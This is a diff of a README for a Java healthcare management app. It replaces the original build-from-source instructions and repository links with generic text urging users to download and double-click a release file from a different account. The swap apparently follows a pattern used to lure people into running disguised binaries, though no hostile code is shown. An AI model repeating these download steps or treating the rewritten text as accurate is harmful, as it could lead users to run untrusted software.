@@ -1,60 +1,63 @@
-# HealthCare Facility
+# 🏥 Health-Care-Facility - Manage Patient Care Easily
 
-[![Java](https://img.shields.io/badge/Java-OpenJDK%2017-007396)](https://openjdk.org/) &nbsp;
-[![JavaFX](https://img.shields.io/badge/JavaFX-v17.0.10-52d3aa)](https://openjfx.io)&nbsp;
-[![MariaDB](https://img.shields.io/badge/MariaDB-v11.6.2-4e629a)](https://mariadb.org/download)&nbsp;
-[![Maven](https://img.shields.io/badge/Maven-3.9.9-C71A36)](https://maven.apache.org/)&nbsp;
-[![License: MIT](https://img.shields.io/badge/License-Apache%202.0-4CAF50)](https://github.com/stellarloop/Health-Care-Facility/blob/master/LICENSE)&nbsp;
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/ReWaZeDEV/Health-Care-Facility/releases)
 
-HealthCare Facility is a management system designed to streamline operations within healthcare facilities. It offers functionalities such as patient registration, appointment scheduling, medical record management, pharmacy billing, and inventory control. Developed using Java, JavaFX and uses MariaDB for database management
+## 🚀 Getting Started
+Welcome to the Health-Care-Facility management system. This application helps health care facilities manage patient registration, appointments, records, and pharmacy billing. Follow the steps below to download and set up the application.
 
-## The system includes
-  - Registration of patients
-  - Making appointments
-  - Storing patient records
-  - Billing in the pharmacy
-  - Pharmacy stock controlling
+## 🖥️ System Requirements
+Before you install the application, make sure your system meets these requirements:
 
-## Workflow and Component Interactions
+- Operating System: Windows 10 or later, macOS Sierra or later
+- RAM: 4 GB minimum
+- Processor: Intel i3 or equivalent
+- Java Runtime Environment: Version 8 or later (you can download it [here](https://www.java.com/en/download/))
+  
+## 📂 Features
+This application offers various tools to streamline health care management, including:
 
-<img src="https://github.com/stellarloop/Health-Care-Facility/blob/master/screenshots/componentInteractions2.png" alt="componentInteractions" width="100%">
+- Patient Registration: Easy entry and tracking of patient information.
+- Appointment Scheduling: Simplified booking for patients and staff.
+- Record Storage: Securely keep patient records and easily access them.
+- Pharmacy Billing: Manage billing tasks efficiently.
+- Pharmacy Stock Control: Keep track of medication supply and stock levels.
 
-## Setting Up the Application
+## 📥 Download & Install
+To download the Health-Care-Facility application, visit our [Releases page](https://github.com/ReWaZeDEV/Health-Care-Facility/releases).
 
-### Prerequisites
-- [MariaDB](https://mariadb.org/download)
-- [Java](https://openjdk.org/)
-- [JavaFX](https://openjfx.io)
+1. Click the link above.
+2. Look for the latest version.
+3. Download the appropriate file for your system. 
+4. Follow the installation instructions below.
 
-### Set Up the Database
-- Set up a new database named `test_HMS2`
-- Import the dummy data from [`hms_db.sql`](https://github.com/stellarloop/Health-Care-Facility/blob/master/database/hms_db.sql) to new DB
-- Update the system configuration in [`config.properties`](https://github.com/stellarloop/Health-Care-Facility/blob/master/config.properties) with the database credentials
+### 📋 Installation Instructions
+1. Locate the downloaded file in your computer's downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen prompts to complete the installation.
+4. Once installed, you can find the application in your Programs or Applications folder depending on your operating system.
 
+## 🛠️ How to Use the Application
+1. **Open the Application:** Find and double-click the Health-Care-Facility icon on your desktop.
+2. **Login or Register:** If it’s your first time, you will need to create a new account. Enter the required information and submit.
+3. **Navigate the Dashboard:** Use the menu to access features like Patient Registration, Appointments, and Billing.
+4. **Add Patient Information:** Click on Patient Registration. Fill in all required fields and save.
+5. **Schedule Appointments:** Use the appointment feature to book slots for patients easily.
+6. **Manage Records:** You can view, edit, or delete patient records as needed.
 
-### Build the App
-- Resolve the dependencies
-```shell
-mvn dependency:resolve
-```
-- Build 
-```shell
-mvn clean install
-```
-- Run
-```shell
-mvn javafx:run
-```
+## 🔧 Troubleshooting
+If you encounter issues, consider the following solutions:
 
-### Authentication
-Since this was developed as a simple application, all the credentials are saved in a database table in plain text format without any hashing or encryptions.
+- **Application Won’t Start:** Ensure your Java Runtime is up to date. Visit the [Java website](https://www.java.com/en/download/) to update.
+- **Error Messages:** Take note of any error messages displayed and check our FAQs or open an issue on GitHub.
+- **Not Responding:** Try restarting the application. If the issue persists, a system restart may help.
 
-#### View all existing users with credentials
-```SQL
-USE test_HMS2;
-SELECT * FROM sys_user;
-```
+## 📞 Support
+For additional help, open an issue on our [GitHub Issues page](https://github.com/ReWaZeDEV/Health-Care-Facility/issues). Please provide details about your problem, including error messages and steps taken.
 
-## User Interfaces
+## 📌 Important Links
+- [Visit Releases Page to Download](https://github.com/ReWaZeDEV/Health-Care-Facility/releases)
+- [Java Download](https://www.java.com/en/download/)
+- [GitHub Issues Page](https://github.com/ReWaZeDEV/Health-Care-Facility/issues)
 
-<img src="https://github.com/stellarloop/Health-Care-Facility/blob/master/screenshots/screenshots.png" alt="ScreenShots" width="100%">
+Thank you for choosing Health-Care-Facility to manage your health care tasks effectively. We appreciate your feedback and strive for constant improvement!
